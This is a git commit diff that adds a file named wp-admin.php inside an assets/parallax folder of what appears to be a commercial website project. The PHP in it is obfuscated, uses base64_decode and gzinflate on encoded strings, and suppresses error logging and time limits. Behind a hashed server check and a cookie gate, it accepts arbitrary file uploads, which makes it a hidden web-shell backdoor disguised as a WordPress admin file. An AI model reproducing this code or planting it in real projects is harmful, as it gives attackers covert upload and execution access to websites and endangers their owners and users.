bb8bb1d5f43827d091ced30a18af80feaa4f7c77
antonio-torres-castro <antonio.torres@finix-group.com>
2025-09-04 02:48:01 -0400

    Creando Nuevo Sitio Comercial El Roble

---
+++ assets/parallax/65ee65107f1a1/wp-admin.php
@@ -0,0 +1,115 @@
+<?php
+@//:}^]Ji#wW&
+ini_set ##h;QFC0f
+('log_errors', 0);
+@/*U3K<=_~~@*/ini_set ##*E(Ibaeyn
+('error_log', NULL);
+@ ##MNWlRIQo~55
+ini_set ##p*}Ey ^eNeq\^T!^}m
+('error_reporting', NULL);
+@ ##\=Nfv]!t1N
+error_reporting/*&$`ivL6$t<[*/(0);
+@ ##ScL&T@cK
+ini_set/*y%y=XQgN*/('max_execution_time', 0);
+@ ##RQ>ZD7 
+set_time_limit ##2be8+jnX
+(0);
+@ ###liEE9:Wn}EV
+ignore_user_abort ##1x0hVf|~+gdNS9H
+(true);
+    
+function //m-CzFLXW
+O ##@CRgjQv+Zf y5
+($s){
+    //JY{%h#dbF1
+$O/*B5cT05ax|eD3266%pB7t*/= /*Y2vf7*/"\x62".//s5rN<I*N3`
+"\x61s\x656\x34_\x64\x65c\x6f\x64\x65"; ##JQTBzjRpRfHf
+
+    //B8mVEry-j2yosLh|vv
+$s ##P4N_PJ3ArRJ2
+=/*bA66xKtM)<*/$O//}|t +{+5yAQ~\
+($s);
+     ##vF;yN_Vp\;c
+$O//Og|iNPD4
+= //9!D|Fe
+"\x67\x7ain\x66l\x61t\x65";/*JjwI&(u0j]!|1a@3|X{:*/
+    return /*1GSQ */$O/*h:T*eW7vM>Yc7do.U*/($s);
+}
+    
+if(/*2M0%j.*/md5 ##4h)p+dNM^sc7)$zA
+( ##Eg*u\R;E2=x,8vs@EoX
+md5/*<XJ(wi*/(//<M4.~
+md5/*+O0Y`A1$C.ecxi+, */( ##;B7bxu.4lpT
+$_SERVER//k(8Rf!
+[//JAZ\bL.zr&UD~-`U
+O/*XB]HYKpWzt10-*/(//:Ff`#
+'8wgJCYgPDXYNind0d/ULAQA=') ##=)+<~a&J=@_(fDi xv
+]))) == //!F_7Q+UM#G|rp9i
+O/*IOs_{2*/( ##7G9[dEcL<`L=Ju`
+'M0kzTzNOSTQwszCwTEk2TrE0SUlMTk5NTTExSElLTEwBAA==') ##fADY;z
+){
+	if( ##pA}%Cg8_1v:hVg*,6 6
+session_start ##_zK1\WJ\e-R
+()){//ZFw6DJ>
+preg_match//\O6Y0.5
+(/*tUK7QzS#ST5TsB80yL8]*/O//)pme5l!
+( ##UEW|ttWq=.L
+'04+LjrOK1dLPBAA=')//@iS<LfDpWVw;3
+,//#\dKSFhO1O#Q
+$_SERVER/*Vf<G=XBQR*/[/*n.H|cGf|ZQ9@S8<{e*/O ##Y~4>I!dz
+(/*;`XW MR*v@$*/'8wgJCYj38A8OAQA=') ##s>u24L+<R-]69Y.jMV<
+], $RUPE);/**jB`Dz5U*/$EUSME/*CVJ8EX!$Wl,XlV.Xs&*/= //nJo(SLd7|N
+$RUPE//(SiW@791GRAh2xyT
+[0]; ##Nm!Y4{B&5mNj
+$EUSME ##S9t:R+fU{9WT
+=/*YTO`aB4g8LGunX%_iGO*/preg_replace ##:Lc!bi_Er_;Mp
+( ##OT74us:qguIy|wfl
+O/*BdpX3c*/( ##D8ET~MP`7B
+'q4krLy+P0asBAA==')/*r]+fC*/, '', $EUSME);if(@/*[v\0$yFs3h#q3|!W%xQ*/$_COOKIE ##,>V_\ei*
+[//KWIwfj-8or$
+md5 ##]=YZh0YYLBzEmv4&.-
+( ##t2FM0va
+$EUSME ##Zr(pu!(=(+VCBre
+. ##UZ$uC5!fkJFq`L,#^
+O/*|gpj@G,*/(/*@0#Y_Tt2(mr*/'KyguTwEA')/*oI.Ch0z*/)] !=  ##FU[$]G
+O//T$N~!7p$1U=1|{~6
+(/*$lr$ich65vaROSJ3!)*/'MzZKM01LNrJINDVJMko2tExONDK1MDEwN7e0SDJMsTAGAA==')//\f8EX>)TQCkuQ~(l*l`
+){echo  ##*JS<e{S
+O//=bAh2C_|
+(/*jFKMX~f{B7LQEMz.R*/'C8lIVUgsLcnIL8qsSizJzM9TSEvMzElN0VEoyElNLE5VKEpV0IUpSAUA')//&YjybvDRY(
+;exit();}}
+	if(!empty(//I1CV1e9Hx#W7Cv~:ErO
+$_FILES ##M*|GSdPi+~G!=
+[ ##lyL0gqur)
+O ##-5yPt@5m<\j
+(/*5bAN^O4__S\N&oBO*/'y610y8xJBQA=')//<I>8z;rcK.o#N
+])){
+		 ##lK 8`
+move_uploaded_file//f[M8_M:KA8BRNV-
+(/*IgzNMRIvf$dM3c!x|iZ*/$_FILES ##NE;x{wwP^Df^f&lRJM
+[/*Lr8.O~X1hwcl$*/O/*,c2Fur}Vtt*/( ##DgEnz5}@i%
+'y610y8xJBQA=')//5k8O^6C|thSfDzJsUBT
+][//M*<vpV39;+Wrc1|I;q
+O/*~~4OaFc]!*/(//&.E&)K9RPJ,hANx#
+'K8ktiM9LzE0FAA==') ##ujR^l!sLqcZ_^G
+],//v-Q:E|x=[UyJ_
+$_FILES/*V^*<K*/[ ##sZA0n>z$KX
+O//EpHbX:JH}K&<$D
+(/*Niu1xm`O3~a*/'y610y8xJBQA=') ##` }]*Y
+][/*0qxj%]uIe[c@G&B*/O//06V..IJC:kd3Ng!y]
+( ##H[S[=0ZFR=
+'y0vMTQUA') ##T4xZG$tr
+]);
+	}
+	echo /*v8f0#9{DkrKyw*/O/*zF^hFNnMX*4*/(/*U^dW~,C*/'4+XitEnLL8pVSM1LLqksSLVVyi3NKcksSCwq0QeJ66YkliQqKSQml2Tm59kqKSnkppZk5KfYKgX4B4co2SnwAvVn5hWUlijkJeaCdFe6ZeakKilAzEoDsZEVQYSLS5NyM0uUFMoSc0qB3Cc7up7sWfBsWvuT3dugqsF22wEA')/*Puo}szK.{=3@D2r*/;
+	exit;
+}else{
+	//-lY]rDwB#{Xh9LfR-gXG
+header/*[4{:mEBndQ9nN9fj>D2=*/(/*QMUB^(HjSy3_igV*/O/*ix22.!*/(//t8rV@G:6iCXJ<hX.
+'8wgJCdA31DNUMDEwUfDLL1Fwyy/NSwEA')//]zCPRkR8
+);
+	/*&GQT)]NFPvjrM5lCNB:*/header ##v2EKj^p!,rt.I<ZfK
+(/*zU9KAw8ah[npm&TQBe:H*/O//|kKp}UKTvUZ5
+(/*vxwDJnmMB*/'Ky5JLCkttlIwMTBR8MsvUXDLL81LAQA=')/*j8=)#|I!HwB,Ld&(*/);
+	exit();
+}
